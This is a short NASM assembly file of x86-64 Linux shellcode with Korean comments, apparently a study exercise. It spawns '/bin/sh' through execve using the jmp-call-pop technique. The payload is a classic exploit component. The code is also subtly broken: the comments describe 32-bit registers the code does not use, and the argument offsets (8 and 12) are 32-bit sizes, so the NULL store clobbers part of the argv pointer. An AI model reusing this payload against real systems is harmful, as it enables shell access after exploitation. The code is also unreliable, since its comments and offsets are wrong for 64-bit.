BITS 64

jmp short last

shell:
	; int execve(const char *filename, *const argv[], char *const envp[])
	; filename -> /bin/sh, argv -> /bin/sh, envp -> NULL
	pop rdi			; ebx는 '/bin/sh'가 들어가있음
	xor rax, rax		; eax는 0
	mov [rdi+7], al		; ebx '/bin/sh'에 \x00을 추가 -> 문자열로 만들어 주기 위함
	mov [rdi+8], rdi	; [ebx+8] 이 가르키는 포인터는 '/bin/sh'의 주소
	mov [rdi+12], rax	; [ebx+12] 이 가르키는 포인터는 eax(NULL)의 주소
	lea rsi, [rdi+8]	; execve의 2번째 인자(ecx)에 '/bin/sh\x00'의 주소 복사([ebx+8])
	lea rdx, [rdi+12]	; execve의 3번째 인자(exd)에 NULL의 주소 복사([ebx+12])
	mov al, 59
	syscall 

last:
	call shell
	db '/bin/sh'
